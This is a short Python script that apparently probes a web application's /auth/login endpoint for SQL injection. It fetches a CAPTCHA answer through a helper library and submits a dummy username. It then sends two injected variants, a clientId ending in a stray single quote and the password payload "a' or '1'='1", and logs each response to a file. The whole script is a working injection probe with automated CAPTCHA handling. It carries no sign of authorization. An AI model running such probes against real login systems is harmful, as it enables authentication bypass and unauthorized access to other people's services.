import lib,time,json
def run(tag, ov):
    cap=None
    for i in range(5):
        c,t,d,dt=lib.get_code()
        if c and c['ans'] is not None:
            cap=c; break
        print('  retry_code',(t or '')[:60]); time.sleep(6)
    if not cap:
        print(tag,'NO_CODE'); return
    body={'tenantId':'000000','username':'no_such_user_9x8z','password':'Zz9!notreal',
          'code':str(cap['ans']),'uuid':cap['uuid'],'clientId':lib.CLIENT_ID,'grantType':'password'}
    body.update(ov)
    st,txt,dt2=lib.post_json('/auth/login',body)
    print('[%s] st=%s %.2fs RESP %s'%(tag,st,dt2,(txt or '')[:600].replace('\n',' ')))
    open('log_%s.txt'%tag,'w').write(json.dumps({'body':body,'status':st,'resp':txt,'time':dt2},ensure_ascii=False,indent=1))
run('12_clientid_sq', {'clientId':lib.CLIENT_ID+"'"})
time.sleep(4)
run('13_password_sq', {'password':"a' or '1'='1"})
